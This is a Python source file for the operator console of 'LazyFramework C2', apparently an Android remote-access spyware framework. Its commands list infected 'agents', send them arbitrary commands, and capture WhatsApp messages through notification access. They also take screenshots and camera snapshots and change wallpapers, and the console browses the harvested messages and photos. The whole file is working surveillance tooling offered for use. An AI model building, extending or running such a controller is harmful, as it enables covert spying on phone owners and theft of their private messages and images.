#!/usr/bin/env python3
"""
LazyFramework C2 CLI - Complete version
"""

import argparse
import json
import os
import glob
from datetime import datetime
from database import get_agents, get_commands, get_results, save_command, delete_old_results, get_stats
import sys

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_header(text):
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}{Colors.ENDC}\n")

def print_success(text):
    print(f"{Colors.GREEN}✅ {text}{Colors.ENDC}")

def print_error(text):
    print(f"{Colors.RED}❌ {text}{Colors.ENDC}")

def print_warning(text):
    print(f"{Colors.YELLOW}⚠️  {text}{Colors.ENDC}")

def format_file_size(size):
    if size <= 0: return "0 B"
    units = ["B", "KB", "MB", "GB"]
    digit_groups = int((len(str(size)) - 1) / 3)
    return f"{size / (1024 ** digit_groups):.1f} {units[digit_groups]}"

# ==================== AGENTS ====================
def cmd_list_agents(args):
    print_header("Connected Agents")
    agents = get_agents(limit=1000)
    if not agents:
        print_warning("No agents connected")
        return
    print(f"{Colors.CYAN}{'Agent ID':<20} {'Device':<20} {'Android':<10} {'Last Seen':<20}{Colors.ENDC}")
    print("-" * 70)
    for agent in agents:
        agent_id = agent['agent_id'][:16] + "..." if len(agent['agent_id']) > 16 else agent['agent_id']
        device = (agent['device'] or 'Unknown')[:20]
        android = (agent['android_version'] or 'Unknown')[:10]
        last_seen = datetime.fromisoformat(agent['last_seen']).strftime('%Y-%m-%d %H:%M:%S')
        print(f"{agent_id:<20} {device:<20} {android:<10} {last_seen:<20}")
    print(f"\n{Colors.GREEN}Total: {len(agents)} agents{Colors.ENDC}\n")

# ==================== COMMANDS ====================
def cmd_send_command(args):
    print_header("Send Command")
    if not args.agent_id or not args.command:
        print_error("Specify --agent-id and --command")
        return
    cmd_id = save_command(agent_id=args.agent_id, command=args.command, status='pending')
    print_success(f"Command sent! ID: {cmd_id}")
    print(f"Agent: {args.agent_id}\nCommand: {args.command}\n")

# ==================== RESULTS ====================
def cmd_list_results(args):
    print_header(f"Results for {args.agent_id}")
    results = get_results(agent_id=args.agent_id, limit=20)
    if not results:
        print_warning("No results")
        return
    print(f"{Colors.CYAN}{'ID':<5} {'Command':<25} {'Size':<10} {'Created':<20}{Colors.ENDC}")
    print("-" * 60)
    for r in results:
        size = f"{r['result_size']/1024:.1f}KB" if r['result_size'] else "0KB"
        created = datetime.fromisoformat(r['created_at']).strftime('%Y-%m-%d %H:%M:%S')
        print(f"{r['id']:<5} {r['command'][:25]:<25} {size:<10} {created:<20}")
    print(f"\n{Colors.GREEN}Total: {len(results)} results{Colors.ENDC}\n")

# ==================== WHATSAPP ====================
def cmd_wa_start(args):
    print_header("WhatsApp Capture - Start")
    if not args.agent_id:
        print_error("Specify --agent-id")
        return
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_START', status='pending')
    print_success(f"WhatsApp capture started! ID: {cmd_id}")
    print(f"\n{Colors.YELLOW}⚠️  IMPORTANT:{Colors.ENDC}")
    print("1. Enable notification access in Settings → Notification Access")
    print("2. Find and enable 'LazyAgent' or 'Notification Listener'\n")

def cmd_wa_stop(args):
    print_header("WhatsApp Capture - Stop")
    if not args.agent_id:
        print_error("Specify --agent-id")
        return
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_STOP', status='pending')
    print_success(f"WhatsApp capture stopped! ID: {cmd_id}\n")

def cmd_wa_dump(args):
    print_header("WhatsApp Messages - Dump")
    if not args.agent_id:
        print_error("Specify --agent-id")
        return
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_DUMP', status='pending')
    print_success(f"Dump command sent! ID: {cmd_id}")
    print("Check results or WhatsApp folder for messages\n")

def cmd_wa_list(args):
    print_header(f"WhatsApp Messages for {args.agent_id}")
    msg_dir = 'whatsapp_messages'
    if not os.path.exists(msg_dir):
        print_warning("No WhatsApp messages directory")
        return
    pattern = f"{msg_dir}/{args.agent_id}_messages_*.txt"
    files = glob.glob(pattern)
    if not files:
        print_warning(f"No messages for agent {args.agent_id}")
        return
    print(f"{Colors.CYAN}{'Filename':<40} {'Size':<15} {'Modified':<20}{Colors.ENDC}")
    print("-" * 75)
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        print(f"{filename:<40} {format_file_size(size):<15} {modified:<20}")
    print(f"\n{Colors.GREEN}Total: {len(files)} files{Colors.ENDC}\n")

# ==================== SCREENSHOT ====================
def cmd_screenshot_take(args):
    print_header("Screenshot")
    if not args.agent_id:
        print_error("Specify --agent-id")
        return
    cmd_id = save_command(agent_id=args.agent_id, command='SCREENSHOT', status='pending')
    print_success(f"Screenshot command sent! ID: {cmd_id}\n")

def cmd_screenshot_list(args):
    print_header(f"Screenshots for {args.agent_id}")
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        print_warning("No screenshots")
        return
    pattern = f"{screenshot_dir}/{args.agent_id}_screenshot_*.jpg"
    files = glob.glob(pattern)
    if not files:
        print_warning(f"No screenshots for agent {args.agent_id}")
        return
    print(f"{Colors.CYAN}{'Filename':<40} {'Size':<15} {'Modified':<20}{Colors.ENDC}")
    print("-" * 75)
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        print(f"{filename:<40} {format_file_size(size):<15} {modified:<20}")
    print(f"\n{Colors.GREEN}Total: {len(files)} screenshots{Colors.ENDC}\n")

# ==================== CAMERA ====================
def cmd_camera_snapshot(args):
    print_header("Camera Snapshot")
    if not args.agent_id:
        print_error("Specify --agent-id")
        return
    cmd_id = save_command(agent_id=args.agent_id, command='CAMERA_SNAPSHOT', status='pending')
    print_success(f"Camera snapshot command sent! ID: {cmd_id}\n")

def cmd_camera_list(args):
    print_header(f"Photos for {args.agent_id}")
    photo_dir = 'photos'
    if not os.path.exists(photo_dir):
        print_warning("No photos")
        return
    pattern = f"{photo_dir}/{args.agent_id}_snapshot_*.jpg"
    files = glob.glob(pattern)
    if not files:
        print_warning(f"No photos for agent {args.agent_id}")
        return
    print(f"{Colors.CYAN}{'Filename':<40} {'Size':<15} {'Modified':<20}{Colors.ENDC}")
    print("-" * 75)
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        print(f"{filename:<40} {format_file_size(size):<15} {modified:<20}")
    print(f"\n{Colors.GREEN}Total: {len(files)} photos{Colors.ENDC}\n")

# ==================== WALLPAPER ====================
def cmd_wallpaper_set(args):
    print_header("Set Wallpaper")
    if not args.agent_id or not args.image:
        print_error("Specify --agent-id and --image")
        return
    if os.path.exists(args.image):
        import base64
        with open(args.image, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode()
        command = f"SET_WALLPAPER {image_data}"
        print(f"📁 Using local file: {args.image}")
    else:
        command = f"SET_WALLPAPER {args.image}"
        print(f"🌐 Using URL: {args.image}")
    cmd_id = save_command(agent_id=args.agent_id, command=command, status='pending')
    print_success(f"Wallpaper command sent! ID: {cmd_id}\n")

# ==================== DATABASE ====================
def cmd_stats(args):
    print_header("C2 Server Statistics")
    stats = get_stats()
    print(f"Connected Agents:    {Colors.GREEN}{stats['agents']}{Colors.ENDC}")
    print(f"Pending Commands:    {Colors.YELLOW}{stats['pending_commands']}{Colors.ENDC}")
    print(f"Total Results:       {Colors.BLUE}{stats['results']}{Colors.ENDC}\n")

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(description='LazyFramework C2 CLI')
    subparsers = parser.add_subparsers(dest='category')
    
    # Agents
    agents_parser = subparsers.add_parser('agents', help='Manage agents')
    agents_sub = agents_parser.add_subparsers(dest='action')
    agents_sub.add_parser('list').set_defaults(func=cmd_list_agents)
    
    # Command
    cmd_parser = subparsers.add_parser('command', help='Send commands')
    cmd_sub = cmd_parser.add_subparsers(dest='action')
    cmd_send = cmd_sub.add_parser('send')
    cmd_send.add_argument('-a', '--agent-id', required=True)
    cmd_send.add_argument('-c', '--command', required=True)
    cmd_send.set_defaults(func=cmd_send_command)
    
    # Results
    results_parser = subparsers.add_parser('results', help='View results')
    results_sub = results_parser.add_subparsers(dest='action')
    results_list = results_sub.add_parser('list')
    results_list.add_argument('-a', '--agent-id', required=True)
    results_list.set_defaults(func=cmd_list_results)
    
    # Screenshot
    ss_parser = subparsers.add_parser('screenshot', help='Screenshot commands')
    ss_sub = ss_parser.add_subparsers(dest='action')
    ss_take = ss_sub.add_parser('take')
    ss_take.add_argument('-a', '--agent-id', required=True)
    ss_take.set_defaults(func=cmd_screenshot_take)
    ss_list = ss_sub.add_parser('list')
    ss_list.add_argument('-a', '--agent-id', required=True)
    ss_list.set_defaults(func=cmd_screenshot_list)
    
    # Camera
    cam_parser = subparsers.add_parser('camera', help='Camera commands')
    cam_sub = cam_parser.add_subparsers(dest='action')
    cam_take = cam_sub.add_parser('snapshot')
    cam_take.add_argument('-a', '--agent-id', required=True)
    cam_take.set_defaults(func=cmd_camera_snapshot)
    cam_list = cam_sub.add_parser('list')
    cam_list.add_argument('-a', '--agent-id', required=True)
    cam_list.set_defaults(func=cmd_camera_list)
    
    # Wallpaper
    wp_parser = subparsers.add_parser('wallpaper', help='Wallpaper commands')
    wp_sub = wp_parser.add_subparsers(dest='action')
    wp_set = wp_sub.add_parser('set')
    wp_set.add_argument('-a', '--agent-id', required=True)
    wp_set.add_argument('-i', '--image', required=True)
    wp_set.set_defaults(func=cmd_wallpaper_set)
    
    # WhatsApp
    wa_parser = subparsers.add_parser('wa', help='WhatsApp capture')
    wa_sub = wa_parser.add_subparsers(dest='action')
    wa_start = wa_sub.add_parser('start')
    wa_start.add_argument('-a', '--agent-id', required=True)
    wa_start.set_defaults(func=cmd_wa_start)
    wa_stop = wa_sub.add_parser('stop')
    wa_stop.add_argument('-a', '--agent-id', required=True)
    wa_stop.set_defaults(func=cmd_wa_stop)
    wa_dump = wa_sub.add_parser('dump')
    wa_dump.add_argument('-a', '--agent-id', required=True)
    wa_dump.set_defaults(func=cmd_wa_dump)
    wa_list = wa_sub.add_parser('list')
    wa_list.add_argument('-a', '--agent-id', required=True)
    wa_list.set_defaults(func=cmd_wa_list)
    
    # Database
    db_parser = subparsers.add_parser('db', help='Database operations')
    db_sub = db_parser.add_subparsers(dest='action')
    db_sub.add_parser('stats').set_defaults(func=cmd_stats)
    
    args = parser.parse_args()
    if not hasattr(args, 'func'):
        parser.print_help()
        sys.exit(0)
    try:
        args.func(args)
    except Exception as e:
        print_error(str(e))
        sys.exit(1)

if __name__ == '__main__':
    main()
